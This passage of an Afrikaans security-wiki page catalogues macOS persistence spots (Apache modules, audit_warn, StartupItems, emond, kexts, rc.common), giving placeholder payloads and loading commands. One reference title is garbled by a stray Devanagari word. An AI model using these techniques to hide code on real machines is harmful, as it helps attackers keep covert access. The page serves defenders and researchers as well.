Jy kan in `/etc/apache2/httpd.conf` aandui dat 'n module gelaai moet word deur 'n reël soos die volgende by te voeg:<sup>[32]</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Op hierdie manier sal jou saamgestelde module deur Apache gelaai word. Die enigste vereiste is dat jy dit óf met ’n geldige Apple-sertifikaat moet **onderteken**, óf ’n nuwe vertroude sertifikaat by die stelsel moet voeg en dit daarmee moet **onderteken**.

Dan, indien nodig, kan jy die volgende uitvoer om seker te maak dat die bediener begin:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Kodevoorbeeld vir die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM-ouditraamwerk

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees, auditd moet loop en jy moet 'n waarskuwing veroorsaak
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/etc/security/audit_warn`**
- Root word vereis
- **Sneller**: Wanneer auditd 'n waarskuwing bespeur

#### Beskrywing en Exploit

Wanneer auditd 'n waarskuwing bespeur, word die script **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou payload daarin voeg.<sup>[33]</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Dit is verouderd, dus niks behoort in daardie gidse gevind te word nie.**

Die **StartupItem** is 'n gids wat binne óf `/Library/StartupItems/` óf `/System/Library/StartupItems/` geplaas behoort te word. Sodra hierdie gids geskep is, moet dit twee spesifieke lêers bevat:

1. 'n **rc script**: 'n Shell script wat tydens opstart uitgevoer word.
2. 'n **plist file**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.

Maak seker dat beide die rc script en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas is sodat die opstartproses dit kan herken en gebruik.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ek kan hierdie komponent nie in my macOS vind nie; raadpleeg die writeup vir meer inligting

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

**emond**, wat deur Apple bekendgestel is, is ’n logmeganisme wat onderontwikkel of moontlik verlate blyk te wees, maar steeds toeganklik is. Hoewel hierdie obskure diens nie besonder nuttig vir ’n Mac-administrateur is nie, kan dit as ’n subtiele persistence-metode vir threat actors dien, en sal dit waarskynlik deur die meeste macOS-admins ongemerk bly.<sup>[34]</sup>

Vir diegene wat van die bestaan daarvan bewus is, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek in ’n enkele gids na scripts om uit te voer. Om dit te inspekteer, kan die volgende command gebruik word:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Skrywe: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Ligging

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root vereis
- **Sneller**: Met XQuartz

#### Beskrywing & Exploit

XQuartz word **nie meer in macOS geïnstalleer nie**, dus, indien jy meer inligting wil hê, kyk na die skrywe.<sup>[3]</sup>

### ~~kext~~

> [!CAUTION]
> Dit is so ingewikkeld om kext selfs as root te installeer dat ek dit nie sal oorweeg om hierdeur uit sandboxes te ontsnap of dit selfs vir persistence te gebruik nie (tensy jy 'n exploit het)

#### Ligging

Om 'n KEXT as 'n opstartitem te installeer, moet dit **in een van die volgende liggings geïnstalleer word**:

- `/System/Library/Extensions`
- KEXT-lêers wat in die OS X-bedryfstelsel ingebou is.
- `/Library/Extensions`
- KEXT-lêers wat deur third-party-sagteware geïnstalleer is

Jy kan tans gelaaide kext-lêers lys met:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Vir meer inligting oor [**kernel extensions, kyk na hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Ligging

- **`/usr/local/bin/amstoold`**
- Root vereis

#### Beskrywing & Exploitation

Blykbaar het die `plist` vanaf `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binary gebruik terwyl dit 'n XPC service blootgestel het... die probleem was dat die binary nie bestaan het nie, dus kon jy iets daar plaas, en wanneer die XPC service geroep word, sou jou binary geroep word.<sup>[35]</sup>

Ek kan dit nie meer in my macOS vind nie.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Ligging

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root vereis
- **Trigger**: Wanneer die diens uitgevoer word (selde)

#### Beskrywing & exploit

Blykbaar is dit nie baie algemeen om hierdie script uit te voer nie, en ek kon dit nie eens in my macOS vind nie. As jy dus meer inligting wil hê, kyk na die writeup.<sup>[36]</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dit werk nie in moderne MacOS-weergawes nie**

Dit is ook moontlik om hier **commands te plaas wat tydens opstart uitgevoer sal word.** Voorbeeld van 'n gewone rc.common-script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence-tegnieke en -tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Verwysings

- [1] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Beyond the good ol' LaunchAgents - 1 - shell-opstartlêers](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Beyond the good ol' LaunchAgents - 18 - X11 en XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Beyond the good ol' LaunchAgents - 21 - Heropende toepassings](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Beyond the good ol' LaunchAgents - 20 - Terminal-voorkeure](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Beyond the good ol' LaunchAgents - 13 - Oudio-inproppe](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit-inproppe (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Beyond the good ol' LaunchAgents - 12 - QuickLook-inproppe](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Beyond the good ol' LaunchAgents - 22 - LoginHook en LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Beyond the good ol' LaunchAgents - 4 - cron-take](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Beyond the good ol' LaunchAgents - 2 - iTerm2-opstart](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Beyond the good ol' LaunchAgents - 7 - xbar-inproppe](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Beyond the good ol' LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Beyond the good ol' LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Beyond the good ol' LaunchAgents - 3 - Aanmelditems](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Beyond the good ol' LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Beyond the good ol' LaunchAgents - 24 - Vouleraksies](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Vouleraksies vir Persistence op macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Beyond the good ol' LaunchAgents - 27 - Dock-kortpaaie](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Beyond the good ol' LaunchAgents - 17 - Kleurkiesers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Beyond the good ol' LaunchAgents - 26 - Finder Sync-inproppe](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Ontleding van "Mac File Opener"-Persistence (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Beyond the good ol' LaunchAgents - 16 - Skermbewaarder](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Behoud jou toegang: Skermbewaarders vir macOS-Persistence (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Beyond the good ol' LaunchAgents - 11 - Spotlight-invoerders](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Beyond the good ol' LaunchAgents - 9 - Voorkeurvenster](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Beyond the good ol' LaunchAgents - 19 - Periodieke skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Beyond the good ol' LaunchAgents - 5 - Inpropbare verifikasiemodules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Beyond the good ol' LaunchAgents - 28 - Magtigingsinproppe](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Aanhoudende geloofsbr विस चोरी met magtigingsinproppe (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Beyond the good ol' LaunchAgents - 30 - Die man-konfigurasielêer - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Beyond the good ol' LaunchAgents - 25 - Apache2-modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Beyond the good ol' LaunchAgents - 31 - BSM-ouditraamwerk](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Beyond the good ol' LaunchAgents - 23 - emond, die Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
